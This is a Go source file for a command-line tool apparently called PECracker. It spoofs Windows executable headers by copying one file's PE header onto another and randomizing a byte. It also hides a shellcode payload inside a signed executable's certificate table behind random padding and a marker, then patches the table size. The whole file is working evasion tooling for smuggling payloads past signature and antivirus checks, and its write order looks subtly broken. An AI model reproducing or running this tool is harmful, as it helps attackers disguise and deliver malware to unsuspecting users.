package main

import (
	"crypto/rand"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"github.com/spf13/cobra"
	"io"
	"io/ioutil"
	"os"
)

func check(err error) {
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}

func ExtractPEHeader(filePath string) ([]byte, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	peFile, err := pe.NewFile(file)
	if err != nil {
		return nil, err
	}
	defer peFile.Close()

	dosHeader := make([]byte, 0x40)
	_, err = file.ReadAt(dosHeader, 0)
	if err != nil {
		return nil, err
	}

	peHeaderOffset := int64(binary.LittleEndian.Uint32(dosHeader[0x3C:]))
	peHeaderSize := peHeaderOffset + int64(peFile.FileHeader.SizeOfOptionalHeader) + 24
	peHeader := make([]byte, peHeaderSize)
	_, err = file.ReadAt(peHeader, 0)
	if err != nil {
		return nil, err
	}

	return peHeader, nil
}

func WritePEHeader(header []byte, outputPath string) error {
	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.Write(header)
	if err != nil {
		return err
	}

	return nil
}

func ReplacePEHeader(targetFilePath string, newHeader []byte) error {
	file, err := os.OpenFile(targetFilePath, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteAt(newHeader, 0)
	if err != nil {
		return err
	}

	return nil
}

func RandomizeByteAtOffset(filePath string, offset int64) error {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	randomByte := make([]byte, 1)
	_, err = rand.Read(randomByte)
	if err != nil {
		return err
	}

	_, err = file.WriteAt(randomByte, offset)
	if err != nil {
		return err
	}

	return nil
}

func GenerateRandomBytes(length int) ([]byte, error) {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		return nil, err
	}
	return bytes, nil
}

func getCertTableSize(peFile *pe.File) (uint32, uint32) {
	certTable := peFile.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY]
	return certTable.VirtualAddress, certTable.Size
}

func main() {
	fmt.Println(" (                                         \n )\\ )      (                   )           \n(()/((     )\\  (      )     ( /(   (  (    \n /(_))\\  (((_) )(  ( /(  (  )\\()) ))\\ )(   \n(_))((_) )\\___(()\\ )(_)) )\\((_)\\ /((_|()\\  \n| _ \\ __((/ __|((_|(_)_ ((_) |(_|_))  ((_) \n|  _/ _| | (__| '_/ _` / _|| / // -_)| '_| \n|_| |___| \\___|_| \\__,_\\__||_\\_\\\\___||_|   \n                                           ")
	fmt.Println("written by https://github.com/berryalen02/PECracker")
	var rootCmd = &cobra.Command{
		Use: "PECracker.exe",
		// 禁用默认的 completion 和 help 命令
		CompletionOptions: cobra.CompletionOptions{
			DisableDefaultCmd: true,
		},
	}

	var replacerCmd = &cobra.Command{
		Use:   "replace",
		Short: "文件头替换伪装",
	}

	var extractCmd = &cobra.Command{
		Use:   "extract [PE file] [output]",
		Short: "提取PE文件头并保存到output路径",
		Args:  cobra.ExactArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			header, err := ExtractPEHeader(args[0])
			check(err)

			err = WritePEHeader(header, args[1])
			check(err)

			fmt.Println("PE header extracted and written to", args[1])
		},
	}

	var importCmd = &cobra.Command{
		Use:   "import [HeaderFile] [target]",
		Short: "导入文件头并对target文件做替换",
		Args:  cobra.ExactArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			header, err := os.ReadFile(args[0])
			check(err)

			err = ReplacePEHeader(args[1], header)
			check(err)

			err = RandomizeByteAtOffset(args[1], 0x23)
			check(err)

			fmt.Println("PE header replaced and randomized in", args[1])
		},
	}

	var crackerCmd = &cobra.Command{
		Use:   "crack",
		Short: "针对文件头的crack",
	}

	var injectCmd = &cobra.Command{
		Use:   "inject [PeFile] [output] [ShellcodeFile]",
		Short: "注入shellcode至PE文件",
		Args:  cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			file, err := os.OpenFile(args[0], os.O_RDWR|os.O_CREATE, 0644)
			check(err)
			defer file.Close()

			peFile, err := pe.NewFile(file)
			check(err)
			defer peFile.Close()

			certOffset, certSize := getCertTableSize(peFile)

			shellcode, err := ioutil.ReadFile(args[2])
			check(err)

			paddingSize := 8 - (len(shellcode) % 8)
			if paddingSize == 8 {
				paddingSize = 0
			}

			padding := make([]byte, paddingSize)
			obfusSize := 16
			obfusPadding := make([]byte, obfusSize)
			obfusPadding, err = GenerateRandomBytes(obfusSize)

			embedData := make([]byte, 8)
			embedData = []byte{0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef}

			outFile, err := os.OpenFile(args[1], os.O_RDWR|os.O_CREATE, 0644)
			check(err)
			defer outFile.Close()

			_, err = outFile.Seek(int64(certOffset+certSize), io.SeekStart)
			check(err)

			_, err = outFile.Write(obfusPadding)
			check(err)
			_, err = outFile.Write(embedData)
			check(err)
			_, err = outFile.Write(shellcode)
			check(err)
			_, err = outFile.Write(padding)
			check(err)

			newCertSize := certSize + uint32(len(shellcode)) + uint32(len(padding)) + uint32(obfusSize) + uint32(len(embedData))

			_, err = outFile.Seek(0, io.SeekStart)
			check(err)

			file.Seek(0, io.SeekStart)
			_, err = io.Copy(outFile, file)
			check(err)

			offset := int64(0x19C)
			buf := make([]byte, 4)
			binary.LittleEndian.PutUint32(buf, newCertSize)
			_, err = outFile.Seek(offset, 0)
			check(err)
			_, err = outFile.Write(buf)
			check(err)

			fmt.Println("PE文件修改成功")
		},
	}

	replacerCmd.AddCommand(extractCmd, importCmd)
	crackerCmd.AddCommand(injectCmd)
	rootCmd.AddCommand(replacerCmd, crackerCmd)
	rootCmd.Execute()
}
